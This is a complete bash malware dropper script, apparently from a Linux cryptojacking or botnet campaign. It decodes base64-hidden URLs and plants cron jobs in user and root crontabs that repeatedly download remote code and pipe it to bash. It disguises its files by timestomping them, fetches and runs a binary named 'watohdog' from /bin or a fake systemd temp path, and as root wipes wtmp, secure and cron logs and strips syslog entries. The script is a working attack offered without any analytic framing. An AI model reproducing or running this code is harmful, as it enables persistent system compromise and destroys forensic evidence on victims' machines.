#!/bin/bash

ARCH=$(uname -m)
me=$(whoami)

house=$(echo aHR0cDovL25hYmxhZGlnaXRhbC5iaXovaW1nL2RkeG94LnBuZwo=|base64 -d)
park=$(echo aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzVqOXpjego=|base64 -d)
room=$(echo aHR0cHM6Ly9hLnBvbWYuY2F0L3dhcmlpZQo=|base64 -d)

function cronlow() {
	cr=$(crontab -l | grep -q "$house" | wc -l)
	if [ ${cr} -eq 0 ];then
		crontab -r
		(crontab -l 2>/dev/null; echo "*/10 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1")| crontab -
	else
		echo "cronlow skip"
	fi
}

function cronhigh() {
	chattr -i /etc/cron.d/root /etc/cron.d/system /etc/cron.d/apache /var/spool/cron/crontabs/root /var/spool/cron/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/10 * * * * root (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1\n##" > /etc/cron.d/root
	echo -e "*/15 * * * * root (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1\n##" > /etc/cron.d/system
	echo -e "*/20 * * * * root (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1\n##" > /etc/cron.d/apache
	echo -e "*/25 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1\n##" > /var/spool/cron/crontabs/root
	echo -e "*/30 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O- $park||curl -fsSLk $room||wget -q -O- $room)|bash > /dev/null 2>&1\n##" > /var/spool/cron/root
	touch -acmr /bin/sh /etc/cron.d/root
	touch -acmr /bin/sh /etc/cron.d/system
	touch -acmr /bin/sh /etc/cron.d/apache
	touch -acmr /bin/sh /var/spool/cron/crontabs/root
	touch -acmr /bin/sh /var/spool/cron/root
}

_curl () {
	read proto server path <<<$(echo ${1//// })
	DOC=/${path// //}
	HOST=${server//:*}
	PORT=${server//*:}
	[[ x"${HOST}" == x"${PORT}" ]] && PORT=80

	exec 3<>/dev/tcp/${HOST}/$PORT
	echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
	(while read line; do
		[[ "$line" == $'\r' ]] && break
	done && cat) <&3
	exec 3>&-
}

rin=$(echo aHR0cDovL25hYmxhZGlnaXRhbC5iaXovaW1nL3FjemdiLnBuZwo=|base64 -d)

function start() {
	mode=$1
	pa=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
	if [ ${pa} -eq 0 ];then
		if [ "$mode" == "low" ]; then
			path="/tmp/systemd-private-64aa0008dfb47a84a96f7974811b772f-systemd-timesyncd.service-TffNff/tmp"
			mkdir -p $path
			rm -rf $path/*
		else
			path="/bin"
			rm -rf $path/watohdog
		fi
		cd $path
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "$path/watohdog" ]; then
				con=$( (curl -fsSL $rin||wget -q -O- $rin||_curl $rin) )
				echo $con | base64 -d > $path/watohdog
				chmod 777 $path/watohdog
				nohup ./watohdog > /dev/null 2>&1 &
			else
				nohup ./watohdog > /dev/null 2>&1 &
			fi
		fi
	fi
}

function finished() {
	mode=$1
	if [ "$mode" == "low" ]; then
		touch /tmp/.tmpf
	else
		touch /tmp/.tmpf
	fi
}

echo "I am $me"
if [ "$me" != "root" ];then
	pz=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
	if [ ${pz} -ne 0 ];then
		echo "It's running"
	else
		start "low"
		sleep 15
		pm=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
		if [ ${pm} -ne 0 ];then
			if [ ! -f "/tmp/.tmpf" ]; then
				finished "low"
			fi
		fi
	fi
fi

if [ "$me" = "root" ];then
	pz=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
	if [ ${pz} -ne 0 ];then
		echo "It's running"
	else
		echo "Setting Up Sys Cron"
		start "high"
		sleep 15
		pm=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
		if [ ${pm} -ne 0 ];then
			if [ ! -f "/tmp/.tmpf" ]; then
				finished "high"
			fi
		fi
		sleep 30
		pm=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
		if [ ${pm} -eq 0 ];then
			start "low"
			sleep 15
			pm=$(ps -fe|grep 'watohdog'|grep -v grep|wc -l)
			if [ ${pm} -ne 0 ];then
				finished "low"
			fi
		fi
	fi

	echo 0>/var/spool/mail/root
	echo 0>/var/log/wtmp
	echo 0>/var/log/secure
	echo 0>/var/log/cron
	sed -i '/pastebin/d' /var/log/syslog
	sed -i '/github/d' /var/log/syslog
fi
